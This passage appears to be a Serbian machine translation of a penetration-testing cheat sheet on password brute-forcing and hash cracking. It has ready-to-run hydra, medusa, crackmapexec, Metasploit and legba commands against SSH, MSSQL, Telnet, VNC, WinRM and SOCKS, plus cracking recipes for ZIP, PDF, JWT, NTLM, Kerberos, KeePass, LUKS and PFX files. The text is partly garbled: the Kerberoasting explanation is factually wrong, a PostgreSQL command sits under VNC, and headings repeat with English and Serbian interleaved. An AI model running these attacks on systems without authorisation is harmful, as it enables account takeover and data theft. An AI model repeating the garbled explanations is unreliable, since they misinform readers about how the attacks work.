Ovaj napad može biti veoma efikasan, posebno ako se koriste slabije lozinke ili ako postoji mogućnost korišćenja lista sa najčešće korišćenim lozinkama. Međutim, važno je napomenuti da je brute force napad ilegalan i može imati ozbiljne pravne posledice. Stoga se preporučuje da se ova tehnika koristi samo u okviru zakonskih i etičkih granica, kao deo legitimnog testiranja bezbednosti ili autorizovanih aktivnosti.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server je popularni sistem za upravljanje bazama podataka koji se često koristi u poslovnom okruženju. Kao i kod drugih baza podataka, SQL Server takođe može biti meta brute force napada. Brute force napad na SQL Server se obično izvodi pokušajem da se pređe preko autentifikacionog sistema i pristupi bazi podataka.

#### Metodologija napada

1. Identifikacija SQL Servera: Prvi korak u napadu je identifikacija SQL Servera koji želite da napadnete. To možete uraditi skeniranjem mreže ili korišćenjem alata kao što je Nmap.

2. Pronalaženje autentifikacionog sistema: Nakon identifikacije SQL Servera, sledeći korak je pronalaženje autentifikacionog sistema koji se koristi. SQL Server može koristiti Windows autentifikaciju, SQL Server autentifikaciju ili kombinaciju oba.

3. Brute force napad: Kada ste identifikovali autentifikacioni sistem, možete započeti brute force napad. Ovo se može uraditi ručno ili korišćenjem alata kao što je Hydra ili Medusa. Napadač će pokušati različite kombinacije korisničkih imena i lozinki sve dok ne pronađe ispravne kredencijale.

4. Eksploatacija: Kada napadač uspešno pronađe ispravne kredencijale, može pristupiti SQL Serveru i izvršavati različite komande. Ovo može uključivati izvršavanje SQL upita, modifikaciju podataka ili čak preuzimanje celokupne baze podataka.

#### Prevencija brute force napada

Da biste sprečili brute force napade na SQL Server, možete preduzeti sledeće mere:

- Koristite jake lozinke: Koristite složene lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Takođe, redovno menjajte lozinke.

- Ograničite broj pokušaja prijave: Postavite ograničenje na broj pokušaja prijave kako biste sprečili napadače da izvršavaju brute force napade.

- Koristite dvofaktornu autentifikaciju: Uključite dvofaktornu autentifikaciju kako biste dodatno zaštitili pristup SQL Serveru.

- Ažurirajte SQL Server: Redovno ažurirajte SQL Server kako biste ispravili poznate sigurnosne propuste i ranjivosti.

- Pratite logove: Pratite logove SQL Servera kako biste identifikovali sumnjive aktivnosti i potencijalne brute force napade.

- Koristite firewall: Konfigurišite firewall kako biste ograničili pristup SQL Serveru samo sa određenih IP adresa ili mreža.

#### Zaključak

Brute force napadi na SQL Server mogu biti veoma opasni jer mogu dovesti do neovlašćenog pristupa osetljivim podacima. Implementacija odgovarajućih sigurnosnih mera može pomoći u sprečavanju ovih napada i zaštiti SQL Servera od potencijalnih ranjivosti.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) je kriptografski protokol koji se koristi za sigurnu komunikaciju između udaljenih računara. Ovaj protokol omogućava enkriptovanu i autentifikovanu vezu, čime se osigurava da se podaci koji se prenose između računara ne mogu lako presresti ili modifikovati.

Brute force napad na SSH je tehnika koja se koristi za pokušaj otkrivanja lozinke za SSH pristup. Ovaj napad se zasniva na isprobavanju različitih kombinacija lozinki sve dok se ne pronađe ispravna lozinka. Postoje različiti alati i metode koje se mogu koristiti za izvođenje brute force napada na SSH.

Jedan od najčešćih alata koji se koristi za brute force napad na SSH je Hydra. Ovaj alat omogućava automatsko isprobavanje različitih kombinacija korisničkih imena i lozinki kako bi se pronašla ispravna kombinacija. Kada se pronađe ispravna lozinka, napadač može dobiti neovlašćen pristup udaljenom računaru.

Da bi se zaštitili od brute force napada na SSH, preporučuje se korišćenje snažnih lozinki koje se teško mogu pogoditi. Takođe je važno koristiti alate za detekciju i sprečavanje brute force napada, kao što su fail2ban ili DenyHosts. Ovi alati mogu automatski blokirati IP adrese koje pokušavaju izvesti brute force napade na SSH.

Ukratko, brute force napad na SSH je tehnika koja se koristi za pokušaj otkrivanja lozinke za SSH pristup. Korišćenje snažnih lozinki i alata za detekciju i sprečavanje brute force napada može pomoći u zaštiti od ovog tipa napada.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Slabe SSH ključeve / Debian predvidljivi PRNG

Neke sisteme karakterišu poznate slabosti u slučajnom semenu koje se koristi za generisanje kriptografskog materijala. To može rezultirati dramatično smanjenim prostorom ključeva koji se mogu probiti pomoću alata kao što je [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Takođe su dostupni i pregenerisani setovi slabih ključeva kao što je [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)

STOMP tekstualni protokol je široko korišćeni protokol za razmenu poruka koji **omogućava besprekornu komunikaciju i interakciju sa popularnim servisima za redove poruka** kao što su RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Pruža standardizovan i efikasan pristup za razmenu poruka i izvođenje različitih operacija sa porukama.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet je mrežni protokol koji omogućava udaljeni pristup i upravljanje drugim računarima putem mreže. Ovaj protokol se često koristi za testiranje sigurnosti mreže i otkrivanje slabosti u sistemima. 

Brute force napad na Telnet se može izvesti pomoću alata kao što su Hydra, Medusa ili Patator. Ovi alati omogućavaju automatsko isprobavanje različitih kombinacija korisničkih imena i lozinki kako bi se pronašli ispravni kredencijali za pristup Telnet serveru. 

Napadači mogu koristiti različite tehnike za poboljšanje efikasnosti brute force napada na Telnet. Na primer, mogu koristiti rečnike sa popularnim lozinkama, kombinacije korisničkih imena i lozinki koje su često korištene, ili čak koristiti tehnike kao što su "credential stuffing" gde se koriste kredencijali koji su već procurili na internetu. 

Važno je napomenuti da brute force napadi mogu biti ilegalni i da se moraju izvoditi samo uz dozvolu vlasnika sistema.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) je tehnologija koja omogućava udaljeni pristup i kontrolu računara preko mreže. Brute force napad na VNC server se može izvesti pokušavajući različite kombinacije korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija. Ovaj napad se može izvesti pomoću alata kao što su Hydra ili Medusa.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) je protokol koji omogućava udaljeno upravljanje Windows operativnim sistemima. Ovaj protokol koristi HTTP prenos podataka preko mreže kako bi omogućio udaljeno izvršavanje komandi, upravljanje servisima i pristup fajlovima na udaljenom Windows računaru.

#### Brute Force napad na Winrm

Brute Force napad na Winrm je tehnika koja se koristi za pokušaj otkrivanja lozinke za pristup Winrm servisu. Ova tehnika podrazumeva automatsko isprobavanje različitih kombinacija lozinki sve dok se ne pronađe ispravna lozinka. Brute Force napad može biti veoma efikasan, ali može zahtevati dosta vremena, posebno ako je lozinka kompleksna.

Da bi se izvršio Brute Force napad na Winrm, koriste se alati kao što su Hydra, Medusa ili Ncrack. Ovi alati automatski isprobavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju. Važno je napomenuti da je Brute Force napad nelegalan i može imati ozbiljne pravne posledice ako se izvršava bez dozvole.

#### Zaštita od Brute Force napada na Winrm

Da biste zaštitili Winrm servis od Brute Force napada, možete preduzeti nekoliko mera:

- Koristite jake lozinke koje se sastoje od kombinacije slova, brojeva i specijalnih karaktera.
- Implementirajte politiku zaključavanja naloga nakon određenog broja neuspelih pokušaja prijavljivanja.
- Koristite dvofaktornu autentifikaciju kako biste dodatno otežali neovlašćen pristup.
- Redovno ažurirajte softver i operativni sistem kako biste ispravili poznate sigurnosne propuste.
- Koristite firewall kako biste ograničili pristup Winrm servisu samo sa pouzdanih IP adresa.

Implementiranjem ovih mera možete značajno smanjiti rizik od uspešnog Brute Force napada na Winrm servis.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** podržane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Lokalno

### Online baze za dešifrovanje

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 i SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/bez ESS/SSP i sa bilo kojom vrednošću izazova)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Heševi, WPA2 snimci i arhive MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Heševi)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Heševi i heševi fajlova)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Heševi)
* [https://www.cmd5.org/](https://www.cmd5.org) (Heševi)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Proverite ovo pre nego što pokušate da izvršite brute force napad na heš.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Napad na zip sa poznatim plaintextom

Potrebno je da znate **plaintext** (ili deo plaintexta) **fajla koji se nalazi unutar** enkriptovanog zipa. Možete proveriti **imenike i veličinu fajlova koji se nalaze unutar** enkriptovanog zipa pokretanjem komande: **`7z l encrypted.zip`**\
Preuzmite [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)sa stranice sa izdanjima.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z je popularan program za arhiviranje i kompresiju podataka. Može se koristiti za brute force napade na zaštićene 7z arhive. Da biste izvršili brute force napad na 7z arhivu, možete koristiti alat poput 7z Cracker-a ili John the Ripper-a.

#### 7z Cracker

7z Cracker je alat koji se koristi za brute force napade na 7z arhive. Može se koristiti za otključavanje lozinki zaštićenih 7z arhiva. Alat koristi različite metode, kao što su rječnik napad, kombinacijski napad i napad s maskom, kako bi pokušao otkriti lozinku.

Da biste koristili 7z Cracker, morate imati instaliran 7z program na svom računalu. Nakon toga, možete pokrenuti 7z Cracker i odabrati ciljanu 7z arhivu za napad. Alat će automatski pokrenuti brute force napad i pokušati otkriti lozinku.

#### John the Ripper

John the Ripper je popularan alat za brute force napade na različite vrste arhiva, uključujući 7z arhive. Može se koristiti za otključavanje lozinki zaštićenih 7z arhiva. Alat podržava različite vrste napada, kao što su rječnik napad, kombinacijski napad i napad s maskom.

Da biste koristili John the Ripper za brute force napad na 7z arhivu, morate imati instaliran John the Ripper na svom računalu. Nakon toga, možete pokrenuti alat i odabrati ciljanu 7z arhivu za napad. Alat će automatski pokrenuti brute force napad i pokušati otkriti lozinku.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF (Portable Document Format) je popularan format za deljenje elektronskih dokumenata. Često se koristi za distribuciju i čuvanje digitalnih knjiga, članaka, uputstava i drugih vrsta dokumenata. PDF format omogućava da dokument izgleda isto na različitim uređajima i operativnim sistemima, čime se očuvava izgled i formatiranje originalnog dokumenta.

Brute force napad na PDF datoteke može se koristiti za pokušaj otkrivanja lozinke koja štiti pristup dokumentu. Ovaj napad se zasniva na sistematskom isprobavanju svih mogućih kombinacija lozinki dok se ne pronađe tačna lozinka. Brute force napad na PDF datoteke može biti vremenski zahtevan proces, posebno ako je lozinka dugačka i kompleksna.

Postoje različiti alati i softveri koji se mogu koristiti za izvođenje brute force napada na PDF datoteke. Ovi alati obično koriste rečnike sa velikim brojem potencijalnih lozinki i automatski isprobavaju svaku lozinku dok ne pronađu tačnu. Važno je napomenuti da je brute force napad ilegalan, osim ako se izvodi na sopstvenim sistemima ili uz dozvolu vlasnika dokumenta.

Da biste zaštitili PDF datoteke od brute force napada, preporučuje se korišćenje snažnih lozinki koje kombinuju različite karakteristike kao što su velika i mala slova, brojevi i posebni znakovi. Takođe je moguće koristiti enkripciju i dodatne sigurnosne mehanizme kako bi se otežao ili onemogućio brute force napad.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Vlasnik lozinke za PDF

Da biste probili vlasničku lozinku za PDF, pogledajte ovo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM krekovanje

NTLM (New Technology LAN Manager) je autentifikacioni protokol koji se koristi u Windows operativnim sistemima. NTLM krekovanje je tehnika koja se koristi za otkrivanje lozinki koje su zaštićene NTLM hashom.

#### Metode NTLM krekovanja

1. **Rečnik napada** - Ova metoda koristi predefinisani rečnik lozinki kako bi se pokušalo sa svakom lozinkom iz rečnika. Ako se pronađe podudaranje sa NTLM hashom, lozinka je uspešno krekovana.

2. **Brute force napad** - Ova metoda koristi sve moguće kombinacije karaktera kako bi se pokušalo sa svakom mogućom lozinkom. Ova metoda je vremenski zahtevna i može potrajati dugo vremena, posebno za složene lozinke.

3. **Rainbow tablice** - Ova metoda koristi prethodno izračunate tablice sa NTLM hashovima i odgovarajućim lozinkama. Ako se pronađe podudaranje sa NTLM hashom, lozinka je uspešno krekovana.

4. **Hibridni napad** - Ova metoda kombinuje rečnik napada i brute force napad kako bi se povećala efikasnost krekovanja lozinki.

#### Alati za NTLM krekovanje

Postoji nekoliko alata koji se mogu koristiti za NTLM krekovanje, uključujući:

- **John the Ripper** - Otvoreni izvor alat za krekovanje lozinki koji podržava NTLM krekovanje.
- **Hashcat** - Napredni alat za krekovanje lozinki koji podržava NTLM krekovanje.
- **Cain & Abel** - Alat za krekovanje lozinki koji podržava NTLM krekovanje, kao i druge napade na autentifikaciju.

#### Mere zaštite od NTLM krekovanja

Da biste se zaštitili od NTLM krekovanja, preporučuje se preduzimanje sledećih mera:

- Korišćenje jakih lozinki koje se teško mogu pogoditi brute force napadom.
- Korišćenje dvofaktorne autentifikacije kako bi se dodatno otežao neovlašćen pristup.
- Redovno ažuriranje sistema i primena sigurnosnih zakrpa kako bi se ispravile poznate ranjivosti.
- Korišćenje sigurnih protokola za autentifikaciju, kao što je Kerberos, umesto NTLM protokola.

NTLM krekovanje je moćna tehnika koju hakeri mogu koristiti za otkrivanje lozinki. Međutim, pridržavanje sigurnosnih mera i korišćenje jakih lozinki može značajno smanjiti rizik od uspešnog krekovanja.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass je besplatan i open-source menadžer lozinki koji omogućava sigurno čuvanje i upravljanje lozinkama. Ovaj alat koristi jaku enkripciju kako bi zaštitio vaše lozinke od neovlašćenog pristupa. Keepass vam omogućava da generišete i čuvate složene lozinke za različite naloge, a sve što trebate zapamtiti je glavna lozinka za pristup Keepass bazi podataka.

Keepass takođe podržava funkcionalnost automatskog popunjavanja lozinki, što vam omogućava da brzo i jednostavno popunite obrasce za prijavu na veb stranicama. Ovaj alat takođe ima mogućnost organizovanja lozinki u grupe i dodavanja dodatnih informacija uz svaku lozinku, kao što su korisničko ime, URL adresa i beleške.

Kako bi se zaštitio od brute force napada, Keepass ima ugrađenu funkcionalnost blokiranja nakon određenog broja neuspelih pokušaja prijavljivanja. Ovo sprečava napadače da pokušavaju da pogode glavnu lozinku metodom isprobavanja različitih kombinacija.

Keepass je veoma popularan alat među korisnicima koji žele da održe visok nivo sigurnosti svojih lozinki. Sa njegovom pomoći, možete efikasno upravljati i zaštititi sve svoje lozinke na jednom mestu.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting je tehnika napada koja se koristi za izvlačenje lozinki iz usluga autentifikacije koje koriste NTLM (New Technology LAN Manager) za šifrovanje lozinki. Ova tehnika se fokusira na slabosti u načinu na koji NTLM šifruje lozinke i omogućava napadačima da izvuku NTLM heš lozinke iz mreže.

Da bi se izvršio keberoasting napad, napadač mora prvo da identifikuje ciljane korisnike koji koriste NTLM za autentifikaciju. Zatim, napadač koristi alat poput "Rubeus" da bi izvršio keberoasting napad. Alat će zatražiti NTLM heš lozinke od ciljanih korisnika i zatim ih dešifrovati koristeći "keberos" protokol.

Napadač može koristiti dobijene lozinke za dalje napade, kao što su pokušaji pristupa drugim sistemima ili servisima koristeći iste lozinke. Da bi se zaštitili od keberoasting napada, preporučuje se korišćenje jačih metoda autentifikacije koje ne koriste NTLM, kao što su Kerberos ili OAuth. Takođe, redovno ažuriranje sistema i promena lozinki može smanjiti rizik od ovog napada.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Slika Lucks

#### Metoda 1

Instalirajte: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metoda 2

##### Brute Force

##### Brute Force

Brute force is a technique used to crack passwords or encryption by systematically trying all possible combinations until the correct one is found. It is a time-consuming method but can be effective if the password is weak or the encryption algorithm is not strong.

Brute force je tehnika koja se koristi za probijanje lozinki ili šifrovanja sistematskim isprobavanjem svih mogućih kombinacija dok se ne pronađe tačna. To je metoda koja oduzima puno vremena, ali može biti efikasna ako je lozinka slaba ili algoritam šifrovanja nije jak.

There are different types of brute force attacks, including:

Postoje različite vrste napada brute force, uključujući:

- **Online brute force**: This type of attack involves directly targeting a login page or an online service and attempting to guess the password by submitting multiple login attempts. It can be easily detected and prevented by implementing account lockouts or CAPTCHA.

- **Online brute force**: Ova vrsta napada uključuje direktno ciljanje stranice za prijavu ili online servisa i pokušaj pogodovanja lozinke slanjem više pokušaja prijave. Može se lako otkriti i sprečiti implementiranjem zaključavanja naloga ili CAPTCHA.

- **Offline brute force**: In this type of attack, the attacker obtains a password hash or an encrypted file and tries to crack it offline by using powerful hardware or software. This method is more time-consuming but can be effective against strong passwords.

- **Offline brute force**: U ovom tipu napada, napadač dobija heš lozinke ili šifrovanu datoteku i pokušava da je probije offline koristeći moćan hardver ili softver. Ova metoda oduzima više vremena, ali može biti efikasna protiv jakih lozinki.

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockouts or rate limiting, and use multi-factor authentication whenever possible.

Da biste se zaštitili od napada brute force, važno je koristiti jake i jedinstvene lozinke, implementirati zaključavanje naloga ili ograničavanje brzine, i koristiti višestruku autentifikaciju kad god je to moguće.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Još jedan Luks BF tutorijal: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Privatni ključ

PGP (Pretty Good Privacy) i GPG (GNU Privacy Guard) su kriptografski softveri koji se koriste za šifrovanje i dešifrovanje podataka, kao i za digitalno potpisivanje poruka. Privatni ključ je ključ koji se koristi za dešifrovanje podataka koji su šifrovani javnim ključem. Ovaj ključ je od vitalnog značaja za održavanje sigurnosti i privatnosti podataka. 

Brute force napad na PGP/GPG privatni ključ je tehnika koja se koristi za pokušaj otkrivanja privatnog ključa isprobavanjem svih mogućih kombinacija. Ova tehnika je vremenski zahtevna i zahteva veliku računarsku snagu. Napadači mogu koristiti različite metode, kao što su rečnici sa lozinkama, kombinacije karaktera ili algoritmi za generisanje ključeva. 

Da biste zaštitili svoj PGP/GPG privatni ključ od brute force napada, preporučuje se korišćenje jakih lozinki koje kombinuju različite vrste karaktera (velika slova, mala slova, brojevi, posebni znakovi) i redovno menjanje lozinke. Takođe je važno da privatni ključ bude čuvan na sigurnom mestu, kao što je sigurnosni token ili hardverski uređaj.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Koristite [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) a zatim john

### Open Office Pwd Protected Column

Ako imate xlsx datoteku sa kolonom koja je zaštićena lozinkom, možete je ukloniti:

* **Otpremite je na Google Drive** i lozinka će automatski biti uklonjena
* Da je **ručno uklonite**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikati

PFX sertifikati su digitalni sertifikati koji se koriste za enkripciju i autentifikaciju podataka. PFX format je popularan jer omogućava skladištenje privatnog ključa i javnog sertifikata u jednom fajlu. Ovi sertifikati se često koriste u SSL/TLS komunikaciji, kao i za digitalno potpisivanje dokumenata.

Da biste izvršili brute force napad na PFX sertifikat, možete koristiti alate kao što su `openssl` ili `john the ripper`. Ovi alati omogućavaju automatsko isprobavanje različitih kombinacija lozinki kako bi se otkrila tačna lozinka za PFX sertifikat.

Kada izvršavate brute force napad na PFX sertifikat, važno je uzeti u obzir snagu lozinke. Korišćenje složenih lozinki sa kombinacijom velikih i malih slova, brojeva i posebnih znakova može otežati napad. Takođe, možete koristiti rečnike sa popularnim lozinkama ili generisati sopstvene rečnike za isprobavanje.

Važno je napomenuti da je brute force napad ilegalan, osim ako se izvodi na sopstvenim sistemima ili uz dozvolu vlasnika sistema. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih hakovanja ili testiranja sigurnosti.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Alati

**Primeri heševa:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identifikacija heša
```bash
hash-identifier
> <HASH>
```
### Wordlistovi

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Alati za generisanje wordlistova**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator koraka po tastaturi sa konfigurabilnim osnovnim karakterima, rasporedom tastera i rutama.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutacija

Pročitajte _**/etc/john/john.conf**_ i konfigurišite ga.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Napadi Hashcat-a

* **Napad sa listom reči** (`-a 0`) sa pravilima

